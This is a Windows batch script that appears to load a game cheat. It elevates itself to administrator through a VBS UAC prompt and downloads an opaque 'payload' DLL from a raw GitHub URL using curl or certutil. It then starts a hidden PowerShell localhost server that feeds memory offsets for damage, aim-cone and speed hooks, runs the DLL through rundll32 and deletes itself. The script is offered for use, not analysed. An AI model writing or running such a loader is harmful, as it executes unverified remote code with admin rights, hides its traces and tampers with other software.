@echo off
setlocal

:: Check Admin
fltmc >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Need Administrator privileges!
    echo Set UAC = CreateObject^("Shell.Application"^) > "%TEMP%\elev.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%TEMP%\elev.vbs"
    cscript //nologo "%TEMP%\elev.vbs"
    del /f /q "%TEMP%\elev.vbs" >nul 2>&1
    exit /b
)

echo [*] Starting components...
set "DLL_URL=https://raw.githubusercontent.com/DIONXasd/update/main/payload"
set "DLL_PATH=%TEMP%\See.dll"

:: Close previous instances
taskkill /f /im rundll32.exe >nul 2>&1
del /f /q "%DLL_PATH%" >nul 2>&1

echo [*] Downloading...
curl.exe -sL --ssl-no-revoke "%DLL_URL%" -o "%DLL_PATH%"
if not exist "%DLL_PATH%" certutil -urlcache -split -f "%DLL_URL%" "%DLL_PATH%" >nul 2>&1

:: Start detached local offset provider in background (persists after bat exits)
powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile -Command $o=\`'{\"weapon_base\":\"0x2087878\",\"ped_offset\":\"0x40\",\"weapon_info\":\"0x20\",\"prop_offsets\":\"0x320,0x324,0x328,0x32C,0x330\",\"pattern_main\":\"0F284F600F2995D0000000F3\",\"mask_main\":\"xxxxxxxxxxxx\",\"patch_low\":\"0F106F60\",\"patch_high\":\"0F285F60\",\"patch_reset\":\"0F284F60\",\"3889\":{\"world_ptr\":\"0x2503A58\",\"damage_hook\":\"0x117EF7C\",\"main_aob\":\"0x9C9DB2\",\"cone_float\":\"0x1B3790C\",\"cone_branch1\":\"0x1049538\",\"cone_branch2\":\"0x1049548\",\"melee_hook\":\"0x10494EB\",\"ret_allow\":\"0x10494FA\",\"ret_skip\":\"0x1049529\",\"ret_body\":\"0x1049521\",\"run_speed_hook\":\"0x9F4C6D\",\"weapon_mgr\":\"0x10B8\",\"world_candidates\":\"0x2503A58\"},\"3258\":{\"world_ptr\":\"0x25B14B0\",\"damage_hook\":\"0x11546DC\",\"main_aob\":\"0x9C2C82\",\"cone_float\":\"0x1A23910\",\"cone_branch1\":\"0x1031704\",\"cone_branch2\":\"0x1031714\",\"melee_hook\":\"0x10316B7\",\"ret_allow\":\"0x10316C6\",\"ret_skip\":\"0x1031716\",\"ret_body\":\"0x10316ED\",\"run_speed_hook\":\"0x9ECF6D\",\"weapon_mgr\":\"0x10C8\",\"world_candidates\":\"0x25B14B0\"}}\`'; $l=New-Object Net.HttpListener; $l.Prefixes.Add(\`'http://127.0.0.1:18888/\`'); $l.Start(); for($i=0;$i -lt 30;$i++){ $c=$l.GetContext(); $u=$c.Request.RawUrl; $r=$c.Response; $r.ContentType=\`'application/json\`'; $b=\`'{\"success\":true,\"message\":\"Initialized\",\"sessionid\":\"1\"}\`'; if($u -match \`'type=var\`'){$esc=$o | ConvertTo-Json -Compress; $b=\`'{\"success\":true,\"message\":\`'+$esc+\`',\"response\":\`'+$esc+\`'}\`';} $buf=[Text.Encoding]::UTF8.GetBytes($b); $r.ContentLength64=$buf.Length; $r.OutputStream.Write($buf,0,$buf.Length); $r.OutputStream.Close(); } $l.Stop();'"

timeout /t 1 /nobreak >nul

echo [*] Loading...
start "" rundll32.exe "%DLL_PATH%",VoidFunc

echo [+] Successfully launched!
set "SELF=%~f0"
start /b "" cmd.exe /c "ping 127.0.0.1 -n 2 >nul & del /f /q %SELF%"
exit /b
